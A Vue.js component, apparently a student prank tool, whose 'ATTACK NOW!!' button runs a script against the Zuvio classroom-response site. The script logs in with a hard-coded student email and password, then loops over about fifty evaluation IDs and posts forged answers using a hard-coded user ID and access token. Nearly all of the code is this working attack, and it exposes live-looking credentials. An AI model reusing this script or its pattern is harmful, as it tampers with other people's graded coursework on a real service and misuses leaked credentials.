<template>
  <v-app justify="center" align="center">
    <v-container fill-height>
      <v-card
        bg
        fill-height
        grid-list-md
        text-xs-center
        row
        wrap
        align-center
        class="mx-auto"
        max-width="600"
        justify-center
        justify="center"
      >
        <mainImage />

        <v-card-subtitle class="pb-0">Xanonymous</v-card-subtitle>

        <v-card-text class="text--primary">
          <div class="my-4" style="font-size:1.7em">
            按下按鈕，神奇的事情將會發生。
          </div>

          <div>純屬娛樂，請勿自行嘗試。</div>
        </v-card-text>

        <v-card-actions justify="center" align="center">
          <v-btn
            block
            align="center"
            justify-center
            center
            x-large
            color="success"
            dark
            @click="attackClicked"
            >ATTACK NOW!!</v-btn
          >
        </v-card-actions>
      </v-card>
    </v-container>
  </v-app>
</template>

<script>
// @ is an alias to /src
const mainImage = () => import("@/components/mainImage");
import Axios from "axios";
Axios.defaults.withCredentials = true;
const api = Axios.create({
  baseURL: "https://irs.zuvio.com.tw/",
  headers: {
    referer:
      "https://irs.zuvio.com.tw/student5/irs/evaluation/7308955/2761672/",
    origin: "https://irs.zuvio.com.tw",
    "Content-Type": "application/json"
  },
  withCredentials: true
});
export default {
  name: "home",
  components: {
    mainImage
  },
  data: () => ({
    attackStatus: false
  }),
  methods: {
    attackClicked() {
      if (!this.attackStatus) {
        this.loginGET();
        this.loginPOST();
        for (let i = 2761670; i <= 2761720; i++) {
          this.attackPOST(i);
        }
      }
    },
    async loginGET() {
      await api.get("/irs/login");
    },
    async loginPOST() {
      let bodyFormData = new FormData();
      bodyFormData.append("email", "t108820039@ntut.edu.tw");
      bodyFormData.append("password", "123");
      await api.post("/irs/submitLogin", bodyFormData);
    },
    async attackPOST(i) {
      let answers = [{ id: "400875", answer: "test87", score: 4 }];
      let my_data = {
        url: "https://irs.zuvio.com.tw" + "/app_v2/answerEvaluation",
        type: "POST",
        data: {
          user_id: 2038529,
          accessToken: "2f308705618ccf7c6046aa2f45b719365c7a0908",
          question_id: 7308955,
          evaluation_id: i,
          answers: answers,
          device: "STUDENT_WEB"
        },
        dataType: "json"
      };
      await $.ajax(my_data);
    }
  }
};
</script>
